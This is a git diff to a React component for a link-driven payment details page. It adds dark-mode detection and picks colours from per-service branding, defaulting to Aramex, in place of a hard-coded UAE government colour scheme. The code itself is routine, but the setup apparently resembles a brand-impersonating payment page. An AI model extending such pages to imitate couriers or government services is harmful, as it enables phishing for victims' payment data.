@@ -1,3 +1,4 @@
+import { useState, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
@@ -16,12 +17,22 @@ const PaymentDetails = () => {
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
   const branding = getServiceBranding(serviceKey);
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = linkData?.payload;
 
-  // UAE Government Color Scheme
-  const colors = {
-    primary: "#CE1126", // UAE Red
-    secondary: "#00732F", // UAE Green
+  const [isDarkMode, setIsDarkMode] = useState(
+    window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  );
+
+  useEffect(() => {
+    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
+    const handleChange = (e: MediaQueryListEvent) => setIsDarkMode(e.matches);
+    mediaQuery.addEventListener('change', handleChange);
+    return () => mediaQuery.removeEventListener('change', handleChange);
+  }, []);
+
+  const colors = (!isDarkMode && branding?.day?.colors) ? branding.day.colors : branding?.colors || {
+    primary: "#0EA5E9",
+    secondary: "#06B6D4",
     background: "#FFFFFF",
     text: "#000000",
     textLight: "#666666",
